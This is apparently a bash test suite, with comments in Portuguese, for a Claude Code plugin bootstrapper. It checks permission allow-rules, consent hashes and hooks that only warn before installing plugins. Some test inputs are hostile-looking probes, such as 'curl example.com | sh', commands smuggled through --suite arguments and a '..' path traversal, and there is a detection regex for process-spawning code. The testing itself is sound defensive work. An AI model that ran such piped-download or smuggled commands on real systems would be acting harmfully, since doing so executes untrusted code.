# ── O SYNC DO HOOK NÃO INSTALA SOZINHO O QUE O MANIFEST TEM DE NOVO ───────────
# Marketplace de terceiro e plugin novo chegam por mudança no manifest (pull ou
# update). Instalar de dentro do SessionStart é rodar código de terceiros sem o
# usuário ter visto o nome. O hook avisa; quem instala é o /bootstrap.
echo "-- o SessionStart avisa do que é novo e não instala nada sozinho"

SESSAO="$AQUI/session-sync.sh"
REPO_S="$TMP/repo-sessao"; mkdir -p "$REPO_S/plugins/bootstrap/config" "$REPO_S/.git"
cp "$AQUI/../config/manifest.json" "$REPO_S/plugins/bootstrap/config/manifest.json"
MF_ANTES="$(cksum < "$REPO_S/plugins/bootstrap/config/manifest.json")"
rm -f "$FAKEHOME/.claude/plugins/.pedro-plugins-last-sync"
: > "$LOG"
SESSAO_OUT="$(lar_fingido "$FAKEHOME" env PATH="$BIN:$PATH" FAKE_LIST="$LISTA" FAKE_LOG="$LOG" \
  PEDRO_PLUGINS_REPO="$REPO_S" PEDRO_CACHE_AVISO=0 CLAUDE_PLUGIN_ROOT="$AQUI/.." \
  CLAUDE_CONFIG_DIR="$FAKEHOME/.claude" bash "$SESSAO" 2>/dev/null)"
check "a sessão não rodou plugin install" "0" "$(grep -c '^plugin install' "$LOG")"
check "a sessão não rodou marketplace add" "0" "$(grep -c '^plugin marketplace add' "$LOG")"
SESSAO_JSON="$(printf '%s\n' "$SESSAO_OUT" | grep '^{')"
check "a sessão emitiu a mensagem de pendência" "1" "$(printf '%s\n' "$SESSAO_JSON" | grep -c '"systemMessage"')"
check "a mensagem entra no contexto do modelo" "1" "$(printf '%s\n' "$SESSAO_JSON" | grep -c '"additionalContext"')"
check "a mensagem nomeia um marketplace de terceiro" "1" "$(printf '%s\n' "$SESSAO_JSON" | grep -c 'agent-browser')"
check "a mensagem aponta o /bootstrap" "1" "$(printf '%s\n' "$SESSAO_JSON" | grep -c '/bootstrap')"
check "o manifest não foi reescrito pelo snapshot" "$MF_ANTES" "$(cksum < "$REPO_S/plugins/bootstrap/config/manifest.json")"

# as duas mensagens passam na régua de texto: a da tela (perfil hook) e a do modelo (contexto)
campo_sessao() { # nome do campo: systemMessage | additionalContext
  printf '%s\n' "$SESSAO_JSON" | python3 -c '
import json,sys
d = json.loads(sys.stdin.readline())
print(d["systemMessage"] if sys.argv[1] == "systemMessage" else d["hookSpecificOutput"]["additionalContext"])' "$1"
}
check "a mensagem da tela passa na régua (perfil hook)" "0" \
  "$(campo_sessao systemMessage | python3 "$AQUI/../lib/regua_texto.py" --perfil hook --onde "aviso" - >/dev/null 2>&1; echo $?)"
check "o contexto do modelo passa na régua (perfil contexto)" "0" \
  "$(campo_sessao additionalContext | python3 "$AQUI/../lib/regua_texto.py" --perfil contexto --onde "contexto" - >/dev/null 2>&1; echo $?)"
check "a tela nomeia o marketplace de terceiro" "1" "$(campo_sessao systemMessage | grep -c 'Marketplaces: agent-browser')"
check "o contexto traz a origem (URL) de cada marketplace pendente" "1" \
  "$(campo_sessao additionalContext | grep -c 'marketplace agent-browser: https://github.com/vercel-labs/agent-browser.git')"
check "o contexto traz os plugins pendentes por marketplace" "1" \
  "$(campo_sessao additionalContext | grep -c '^plugins de claude-plugins-official: ')"

# o que já está instalado segue sincronizando (liga/desliga) mesmo com pendência
cat > "$FAKEHOME/lista-com-bootstrap-desligado.txt" <<'TXT'
Installed plugins:
  ❯ bootstrap@pedro-plugins
    Version: 1.8.0
    Scope: user
    Status: ✔ enabled
  ❯ graphify-guard@pedro-plugins
    Version: 1.0.0
    Scope: user
    Status: ✔ enabled
TXT
: > "$LOG"
lar_fingido "$FAKEHOME" env PATH="$BIN:$PATH" FAKE_LIST="$FAKEHOME/lista-com-bootstrap-desligado.txt" FAKE_LOG="$LOG" \
  PEDRO_PLUGINS_REPO="$REPO_S" CLAUDE_PLUGIN_ROOT="$AQUI/.." \
  bash "$AQUI/lib/apply.sh" >/dev/null 2>&1
check "sem --install-new o que já está instalado continua sincronizando (graphify-guard desligado pelo manifest)" "1" \
  "$(grep -c '^plugin disable graphify-guard@pedro-plugins' "$LOG")"

# ── C1: A PERMISSAO DO INTERPRETE E POR SCRIPT, NAO POR PASTA ─────────────────
# Revisao da PR #12 (C1): `python3 <cache>/pedro-plugins/*` liberava TODO script de
# TODO plugin com qualquer argumento, e `precheck_largada.py --suite '<cmd>'` roda
# <cmd> com `bash -c`. A decisao D-1 e "so os scripts dos plugins", nao "um executor
# generico". Este caso monta um cache com a arvore REAL dos plugins, resolve as regras
# como o apply-config as resolve e confere, script a script, que nenhum que execute
# comando tem regra — com um segundo cobrador (grep no texto) que nao depende da
# analise que gera a lista.
echo "-- C1: nenhum script que executa comando tem regra de allow"

C1="$TMP/ct-c1"
CACHE1="$C1/plugins/cache/pedro-plugins"
mkdir -p "$CACHE1"
for _d in "$AQUI"/../../*/; do
  _n="$(basename "$_d")"
  mkdir -p "$CACHE1/$_n/9.9.9" "$CACHE1/$_n/9.0.0/lib"
  cp -R "$_d". "$CACHE1/$_n/9.9.9/"
done
# uma versao ANTIGA do mesmo plugin, com o mesmo script: so a mais alta ganha regra
cp "$AQUI/../../project-skills/lib/historico.py" "$CACHE1/project-skills/9.0.0/lib/historico.py"
python3 "$AQUI/../lib/cfgjson.py" prepara-defaults "$AQUI/../config/settings-defaults.json" "$C1" com > "$TMP/c1-defaults.json" 2>/dev/null

cat > "$TMP/c1-confere.py" <<'PY'
import json, os, re, sys
defaults, cache = sys.argv[1], sys.argv[2]
perms = json.load(open(defaults, encoding="utf-8"))["permissions"]

def casa(regra, cmd):
    """Casamento do Claude Code, como medido na 2.1.321: `*` vale qualquer texto
    (inclusive `/` e espaco), e `x *` casa `x` sozinho."""
    if not (regra.startswith("Bash(") and regra.endswith(")")):
        return False
    pad = regra[5:-1]
    final_livre = pad.endswith(" *")
    if final_livre:
        pad = pad[:-2]
    rx = "^" + ".*".join(re.escape(t) for t in pad.split("*")) + ("(?: .*)?" if final_livre else "") + "$"
    return re.match(rx, cmd, re.S) is not None

allow, ask, deny = (perms.get(k) or [] for k in ("allow", "ask", "deny"))
def coberto(cmd):
    if any(casa(r, cmd) for r in deny + ask):
        return False
    return any(casa(r, cmd) for r in allow)

# segundo cobrador, independente da analise: texto que cria processo ou avalia codigo
EXEC = re.compile(r"subprocess|os\.system|os\.popen|os\.exec|os\.spawn|shell\s*=\s*True|bash[\"'],\s*[\"']-c|"
                  r"child_process|execSync|spawnSync|\bspawn\s*\(|\beval\s*\(|\bexec\s*\(|new Function")
import io, tokenize
def sem_texto_literal(caminho, t):
    """Tira comentarios e strings: `subprocess` numa frase de doc nao e chamada."""
    if caminho.endswith(".py"):
        try:
            return " ".join(tk.string for tk in tokenize.generate_tokens(io.StringIO(t).readline)
                            if tk.type not in (tokenize.STRING, tokenize.COMMENT))
        except (tokenize.TokenError, IndentationError, SyntaxError):
            return t
    t = re.sub(r"/\*.*?\*/", " ", t, flags=re.S)
    t = re.sub(r"(?m)//.*$", " ", t)
    return re.sub(r"'(?:\\.|[^'\\\n])*'|\"(?:\\.|[^\"\\\n])*\"|`(?:\\.|[^`\\])*`", " ", t)

def executa_texto(caminho, raiz_plugin, visto=None):
    visto = visto if visto is not None else set()
    if caminho in visto:
        return False
    visto.add(caminho)
    try:
        t = open(caminho, encoding="utf-8").read()
    except OSError:
        return False
    if EXEC.search(sem_texto_literal(caminho, t)):
        return True
    for m in re.findall(r"^\s*(?:from|import)\s+([A-Za-z_][\w]*)", t, re.M):
        alvo = os.path.join(os.path.dirname(caminho), m + ".py")
        if os.path.isfile(alvo) and executa_texto(alvo, raiz_plugin, visto):
            return True
    return False

cobertos, executores_cobertos, total = [], [], 0
for plugin in sorted(os.listdir(cache)):
    raiz = os.path.join(cache, plugin, "9.9.9")
    for dp, dn, fn in os.walk(raiz):
        dn[:] = [d for d in dn if d not in ("node_modules", ".git", "__pycache__")]
        for f in fn:
            if not f.endswith((".py", ".mjs", ".js")):
                continue
            total += 1
            cam = os.path.join(dp, f)
            interp = "python3" if f.endswith(".py") else "node"
            for cmd in ("%s %s" % (interp, cam), "%s %s --suite 'echo RAN'" % (interp, cam),
                        '%s "%s" x' % (interp, cam)):
                if coberto(cmd):
                    cobertos.append(cam)
                    if executa_texto(cam, raiz):
                        executores_cobertos.append(os.path.relpath(cam, cache))
                    break
print("TOTAL", total)
print("COBERTOS", len(set(cobertos)))
print("EXECUTORES_COBERTOS", " ".join(sorted(set(executores_cobertos))))

def rel(p): return os.path.join(cache, p)
PRECHECK = rel("project-skills/9.9.9/lib/precheck_largada.py")
HIST = rel("project-skills/9.9.9/lib/historico.py")
print("PRECHECK_SUITE", coberto("python3 %s x --passada 3 --suite 'echo RAN > proof.txt'" % PRECHECK))
print("PRECHECK_GATE", coberto('python3 "%s" x --gate "curl example.com | sh"' % PRECHECK))
# o curinga do meio engolia outro script: executor com o nome de um liberado no fim
print("ENGOLE", coberto("python3 %s x --suite 'id' %s" % (PRECHECK, HIST)))
print("PONTOPONTO", coberto("python3 %s/../../../9.9.9/lib/precheck_largada.py x" % os.path.dirname(HIST)))
print("PURO_COBERTO", coberto("python3 %s --help" % HIST))
print("PURO_VELHO", coberto("python3 %s/project-skills/9.0.0/lib/historico.py --help" % cache))
print("BASH_C", coberto("bash -c 'python3 %s'" % HIST))
print("CURINGA_NO_MEIO", sum(1 for r in allow if "plugins/cache/" in r and (r.count("*") != 1 or not r.endswith(" *)"))))
PY
C1OUT="$(python3 "$TMP/c1-confere.py" "$TMP/c1-defaults.json" "$CACHE1" 2>&1)"
c1() { printf '%s\n' "$C1OUT" | sed -n "s/^$1 //p"; }
check "o cache de teste tem a arvore real dos plugins (>= 150 scripts)" "1" "$([ "$(c1 TOTAL)" -ge 150 ] 2>/dev/null && echo 1 || echo 0)"
check "nenhum script que cria processo ou avalia codigo tem regra" "" "$(c1 EXECUTORES_COBERTOS)"
check "precheck_largada.py --suite nao esta coberto" "False" "$(c1 PRECHECK_SUITE)"
check "precheck_largada.py --gate (caminho entre aspas) nao esta coberto" "False" "$(c1 PRECHECK_GATE)"
check "o curinga nao engole um script executor atras do nome de um liberado" "False" "$(c1 ENGOLE)"
check "caminho com '..' ate o executor nao esta coberto" "False" "$(c1 PONTOPONTO)"
check "script sem execucao (historico.py) continua liberado" "True" "$(c1 PURO_COBERTO)"
check "a versao antiga do mesmo script nao ganha regra" "False" "$(c1 PURO_VELHO)"
check "bash -c embrulhando o script liberado nao casa" "False" "$(c1 BASH_C)"
check "ha regras por script (>= 10 liberados)" "1" "$([ "$(c1 COBERTOS)" -ge 10 ] 2>/dev/null && echo 1 || echo 0)"
check "regra de cache so tem curinga no fim dos argumentos" "0" "$(c1 CURINGA_NO_MEIO)"
check "o allow dos defaults nao traz regra de pasta inteira" "0" \
  "$(python3 -c "import json,sys; a=json.load(open(sys.argv[1]))['permissions']['allow']; print(sum(1 for x in a if x.endswith('/pedro-plugins/*)')))" "$AQUI/../config/settings-defaults.json")"

# a lista gravada e a analise nao podem envelhecer (script novo que executa comando
# nao ganha regra por esquecimento, e um que deixou de executar e liberado de proposito)
check "config/plugin-scripts.json e o relatorio batem com a analise" "0" \
  "$(python3 "$AQUI/../lib/script_audit.py" --confere >/dev/null 2>&1; echo $?)"

# ── I1: O PostToolUse NAO REESCREVE O MANIFEST COM ITEM PENDENTE ──────────────
echo "-- I1: post-plugin-command nao faz snapshot nem push com item pendente"

RAIZ_I1="$TMP/raiz-i1"
cp -R "$(cd "$AQUI/.." && pwd)" "$RAIZ_I1"
ESPIAO="$TMP/espiao-i1.log"
cat > "$RAIZ_I1/hooks/lib/snapshot.sh" <<SH
#!/usr/bin/env bash
echo snapshot >> "$ESPIAO"
echo changed
SH
cat > "$RAIZ_I1/hooks/lib/git-sync.sh" <<SH
#!/usr/bin/env bash
echo "push \$*" >> "$ESPIAO"
SH
chmod +x "$RAIZ_I1/hooks/lib/snapshot.sh" "$RAIZ_I1/hooks/lib/git-sync.sh"

roda_post_i1() { # repo -> n de chamadas ao espiao
  : > "$ESPIAO"
  printf '{"tool_input":{"command":"claude plugin install novo@algum-mkt"}}' |
    lar_fingido "$FAKEHOME" env PATH="$BIN:$PATH" FAKE_LIST="$LISTA" FAKE_LOG="$LOG" \
      PEDRO_PLUGINS_REPO="$1" PEDRO_CACHE_AVISO=0 CLAUDE_PLUGIN_ROOT="$RAIZ_I1" \
      CLAUDE_CONFIG_DIR="$FAKEHOME/.claude" bash "$RAIZ_I1/hooks/post-plugin-command.sh" >/dev/null 2>&1
  wc -l < "$ESPIAO" | tr -d ' '
}
REPO_I1="$TMP/repo-i1"; mkdir -p "$REPO_I1/plugins/bootstrap/config" "$REPO_I1/.git"
cp "$AQUI/../config/manifest.json" "$REPO_I1/plugins/bootstrap/config/manifest.json"
check "com item pendente o hook nao roda snapshot nem push" "0" "$(roda_post_i1 "$REPO_I1")"

REPO_I1B="$TMP/repo-i1b"; mkdir -p "$REPO_I1B/plugins/bootstrap/config" "$REPO_I1B/.git"
echo '{"version":1,"marketplaces":[]}' > "$REPO_I1B/plugins/bootstrap/config/manifest.json"
check "sem pendencia o hook segue rodando snapshot e push (o controle do caso acima)" "2" "$(roda_post_i1 "$REPO_I1B")"

: > "$LOG"
roda_post_i1 "$REPO_I1" >/dev/null
check "a checagem de pendencia nao liga, desliga nem instala nada" "0" "$(grep -c . "$LOG")"

# ── I2: A MARCA DE CONSENTIMENTO GUARDA A LISTA QUE O USUARIO VIU ─────────────
echo "-- I2: a marca guarda o hash da lista aprovada"

mk_cfg() { # dir -> config dir de mentira com o writer do context-guard (para a statusLine)
  mkdir -p "$1/plugins/cache/pedro-plugins/context-guard/9.9.9/hooks"  # acopla-ok: fixture do caminho que o proprio apply-config.sh resolve
  : > "$1/plugins/cache/pedro-plugins/context-guard/9.9.9/hooks/context-guard-writer.sh"  # acopla-ok: fixture do caminho que o proprio apply-config.sh resolve
}
n_allow() { python3 -c "import json,sys; print(len((json.load(open(sys.argv[1])).get('permissions') or {}).get('allow') or []))" "$1" 2>/dev/null; }

CI="$TMP/ct-i2"; mk_cfg "$CI"
touch "$CI/pedro-plugins-permissions-ok"
I2_OUT="$(env CLAUDE_CONFIG_DIR="$CI" CLAUDE_PLUGIN_ROOT="$AQUI/.." bash "$AQUI/lib/apply-config.sh" 2>&1)"
check "marca vazia (versao antiga) nao vale: o allow nao entra" "0" "$(n_allow "$CI/settings.json")"
check "a saida explica que a marca nao traz a lista" "1" "$(printf '%s\n' "$I2_OUT" | grep -c 'sem a lista')"

env CLAUDE_CONFIG_DIR="$CI" CLAUDE_PLUGIN_ROOT="$AQUI/.." bash "$AQUI/lib/apply-config.sh" --consentir >/dev/null 2>&1
check "--consentir grava o hash na marca" "1" "$(head -1 "$CI/pedro-plugins-permissions-ok" | grep -c '^sha256:[0-9a-f]\{64\}$')"
env CLAUDE_CONFIG_DIR="$CI" CLAUDE_PLUGIN_ROOT="$AQUI/.." bash "$AQUI/lib/apply-config.sh" >/dev/null 2>&1
check "com a marca valida o allow entra" "1" "$([ "$(n_allow "$CI/settings.json")" -gt 50 ] && echo 1 || echo 0)"

# os defaults mudam (versao nova do plugin com uma entrada a mais): a marca velha nao cobre
RAIZ_I2="$TMP/raiz-i2"
cp -R "$(cd "$AQUI/.." && pwd)" "$RAIZ_I2"
python3 - "$RAIZ_I2/config/settings-defaults.json" <<'PY'
import json, sys
p = sys.argv[1]
d = json.load(open(p, encoding="utf-8"))
d["permissions"]["allow"].append("Bash(entrada-nova-no-release*)")
json.dump(d, open(p, "w", encoding="utf-8"), indent=2)
PY
CJ="$TMP/ct-i2b"; mk_cfg "$CJ"
env CLAUDE_CONFIG_DIR="$CJ" CLAUDE_PLUGIN_ROOT="$AQUI/.." bash "$AQUI/lib/apply-config.sh" --consentir >/dev/null 2>&1
I2B_OUT="$(env CLAUDE_CONFIG_DIR="$CJ" CLAUDE_PLUGIN_ROOT="$RAIZ_I2" bash "$AQUI/lib/apply-config.sh" 2>&1)"
check "defaults que mudaram desde o sim: o allow nao entra" "0" "$(n_allow "$CJ/settings.json")"
check "a saida mostra o que e novo desde o sim" "1" "$(printf '%s\n' "$I2B_OUT" | grep -cF '+ allow + Bash(entrada-nova-no-release*)')"
LISTAR_J="$(env CLAUDE_CONFIG_DIR="$CJ" CLAUDE_PLUGIN_ROOT="$RAIZ_I2" bash "$AQUI/lib/apply-config.sh" --listar 2>&1)"
check "--listar diz que a marca esta desatualizada" "1" "$(printf '%s\n' "$LISTAR_J" | grep -c 'desatualizada')"
env CLAUDE_CONFIG_DIR="$CJ" CLAUDE_PLUGIN_ROOT="$RAIZ_I2" bash "$AQUI/lib/apply-config.sh" --consentir >/dev/null 2>&1
env CLAUDE_CONFIG_DIR="$CJ" CLAUDE_PLUGIN_ROOT="$RAIZ_I2" bash "$AQUI/lib/apply-config.sh" >/dev/null 2>&1
check "novo sim sobre a lista nova: o allow entra" "1" "$([ "$(n_allow "$CJ/settings.json")" -gt 50 ] && echo 1 || echo 0)"

# uma marca com o hash certo e a lista adulterada nao vale
CK2="$TMP/ct-i2c"; mk_cfg "$CK2"
env CLAUDE_CONFIG_DIR="$CK2" CLAUDE_PLUGIN_ROOT="$AQUI/.." bash "$AQUI/lib/apply-config.sh" --consentir >/dev/null 2>&1
printf 'allow + Bash(curl*)\n' >> "$CK2/pedro-plugins-permissions-ok"
env CLAUDE_CONFIG_DIR="$CK2" CLAUDE_PLUGIN_ROOT="$AQUI/.." bash "$AQUI/lib/apply-config.sh" >/dev/null 2>&1
check "marca adulterada (hash nao bate com as linhas) nao vale" "0" "$(n_allow "$CK2/settings.json")"

# grafias da entrada larga: python3:*, python3 * e python3* sao a mesma coisa
CS="$TMP/ct-i2d"; mk_cfg "$CS"
env CLAUDE_CONFIG_DIR="$CS" CLAUDE_PLUGIN_ROOT="$AQUI/.." bash "$AQUI/lib/apply-config.sh" --consentir >/dev/null 2>&1
cat > "$CS/settings.json" <<'JSON'
{"permissions": {"allow": ["Bash(python3:*)", "Bash(python3 *)", "Bash(node *)", "Bash(env:*)", "Bash(python3 -m pytest*)", "WebFetch(*)", "Bash(ls*)"]}}
JSON
SP_OUT="$(env CLAUDE_CONFIG_DIR="$CS" CLAUDE_PLUGIN_ROOT="$AQUI/.." bash "$AQUI/lib/apply-config.sh" 2>&1)"
check "as outras grafias da entrada larga tambem sao avisadas" "5" "$(printf '%s\n' "$SP_OUT" | grep -c 'retirada do padrão: ')"
env CLAUDE_CONFIG_DIR="$CS" CLAUDE_PLUGIN_ROOT="$AQUI/.." bash "$AQUI/lib/apply-config.sh" --remover-retiradas >/dev/null 2>&1
check "--remover-retiradas tira todas as grafias e deixa as do usuario" "1 1 1" \
  "$(python3 -c "
import json,sys
a=json.load(open(sys.argv[1]))['permissions']['allow']
largas=['Bash(python3:*)','Bash(python3 *)','Bash(node *)','Bash(env:*)','WebFetch(*)']
print(sum(1 for x in largas if x in a)==0 and 1, int('Bash(python3 -m pytest*)' in a), int('Bash(ls*)' in a))" "$CS/settings.json")"

# a regra de pasta inteira que a primeira versao desta correcao distribuia tambem e avisada
CT2="$TMP/ct-i2e"; mk_cfg "$CT2"
env CLAUDE_CONFIG_DIR="$CT2" CLAUDE_PLUGIN_ROOT="$AQUI/.." bash "$AQUI/lib/apply-config.sh" --consentir >/dev/null 2>&1
cat > "$CT2/settings.json" <<JSON
{"permissions": {"allow": ["Bash(python3 $CT2/plugins/cache/pedro-plugins/*)", "Bash(node \"$CT2/plugins/cache/pedro-plugins/*)"]}}
JSON
PD_OUT="$(env CLAUDE_CONFIG_DIR="$CT2" CLAUDE_PLUGIN_ROOT="$AQUI/.." bash "$AQUI/lib/apply-config.sh" 2>&1)"
check "a regra de pasta inteira (python3 e node) e avisada como retirada" "2" "$(printf '%s\n' "$PD_OUT" | grep -c 'retirada do padrão: ')"

echo
echo "$OK ok · $FAIL FAIL"
[ "$FAIL" -eq 0 ]
